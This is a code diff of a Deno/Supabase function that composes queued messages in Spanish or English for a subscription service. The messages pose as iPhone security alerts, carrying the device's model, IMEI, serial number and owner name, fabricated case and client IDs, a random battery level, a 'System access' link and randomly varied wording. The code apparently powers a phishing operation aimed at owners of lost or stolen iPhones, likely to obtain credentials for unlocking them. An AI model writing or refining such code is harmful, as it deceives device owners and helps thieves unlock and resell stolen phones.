@@ -161,7 +161,7 @@ Deno.serve(async (req) => {
     // Get user profile separately
     const { data: userProfile, error: profileError } = await supabase
       .from('profiles')
-      .select('credits, email, telegram_bot_token, telegram_chat_id')
+      .select('credits, email, telegram_bot_token, telegram_chat_id, expiration_date')
       .eq('id', queuedMessage.user_id)
       .single();
 
@@ -170,20 +170,41 @@ Deno.serve(async (req) => {
       throw profileError;
     }
 
-    // Compose final message content
-    if (queuedMessage.template_id) {
-      console.log('Composing message (template path):', queuedMessage.template_id);
+    // Block processing for expired users
+    const isExpired = userProfile?.expiration_date
+      ? new Date() > new Date(userProfile.expiration_date)
+      : false;
 
+    if (isExpired) {
+      console.log('User account expired, marking message as failed');
+      await supabase
+        .from('message_queue')
+        .update({ 
+          status: 'failed',
+          updated_at: new Date().toISOString()
+        })
+        .eq('id', queuedMessage.id);
+
+      return new Response(
+        JSON.stringify({ 
+          message: 'Message failed: Account expired', 
+          processed: 0 
+        }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Compose final message content (consistent for template and non-template, with i18n and correct link position)
+    let customSection = (queuedMessage.message_content || '').toString();
+
+    if (queuedMessage.template_id) {
+      console.log('Composing message using template:', queuedMessage.template_id);
       const { data: template } = await supabase
         .from('message_templates')
         .select('template_content')
         .eq('id', queuedMessage.template_id)
         .single();
 
-      // Start from existing content to preserve any prefilled text
-      let customSection = (queuedMessage.message_content || '').toString();
-
-      // If we have a template, apply variable replacements regardless of current placeholders
       if (template?.template_content) {
         customSection = template.template_content
           .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
@@ -195,53 +216,78 @@ Deno.serve(async (req) => {
           .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
           .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '');
       }
+    }
 
-      // Add URL if available and not already present
-      if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
-        customSection += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
-      }
+    // Localized link label and inclusion near the top (not at the end)
+    const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
+    if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
+      customSection = `${customSection}\n\n${linkLabel}: ${queuedMessage.processes.url}`.trim();
+    }
 
-      // Generate IDs and battery only to enrich the final message
-      const now = new Date();
-      const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
-      const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
-      const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
-      const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
+    // Generate IDs and battery only to enrich the final message
+    const now = new Date();
+    const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
+    const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
+    const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
+    const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
 
-      // New message layout (same for templates and non-templates)
-      const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
-      const openings = [
+    const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
+
+    if (queuedMessage.language === 'spanish') {
+      const openingsES = [
         '🛡️ Alerta de seguridad del sistema',
         '🔐 Notificación de seguridad',
         '🔒 Sistema de protección activado',
       ];
-      const statusPhrases = [
+      const statusPhrasesES = [
         'Detalles del dispositivo:',
         'Información del equipo:',
         'Datos técnicos:',
       ];
-      const deviceSections = [
+      const deviceSectionsES = [
         `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
         `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
         `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
       ];
-      const helpPhrases = [
+      const helpPhrasesES = [
         '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
         '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
         '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
       ];
-      const closings = [
+      const closingsES = [
         'Servicio automatizado – Atención disponible 24 h',
         'Sistema automático – Soporte activo 24/7',
         'Monitoreo continuo – Asistencia permanente',
       ];
 
-      queuedMessage.message_content = `${random(openings)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrases)}\n${random(deviceSections)}\n\n${random(helpPhrases)}\n${random(closings)}`;
+      queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}\n\n${random(helpPhrasesES)}\n${random(closingsES)}`;
     } else {
-      // Non-template path: ensure URL is included if available
-      if (queuedMessage.processes?.url && queuedMessage.message_content && !queuedMessage.message_content.includes(queuedMessage.processes.url)) {
-        queuedMessage.message_content += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
-      }
+      const openingsEN = [
+        '🛡️ System security alert',
+        '🔐 Security notification',
+        '🔒 Protection system activated',
+      ];
+      const statusPhrasesEN = [
+        'Device details:',
+        'Equipment information:',
+        'Technical data:',
+      ];
+      const deviceSectionsEN = [
+        `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
+        `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
+      ];
+      const helpPhrasesEN = [
+        'Need help? Write *Menu* for technical assistance 👨‍💻',
+        'Require support? Reply *Menu* for specialized help 🔧',
+        'Looking for assistance? Send *Menu* to contact support 👩‍💻',
+      ];
+      const closingsEN = [
+        'Automated service – 24 h assistance available',
+        'Automatic system – 24/7 active support',
+        'Continuous monitoring – Permanent assistance',
+      ];
+
+      queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}\n\n${random(helpPhrasesEN)}\n${random(closingsEN)}`;
     }
 
     if (profileError) {
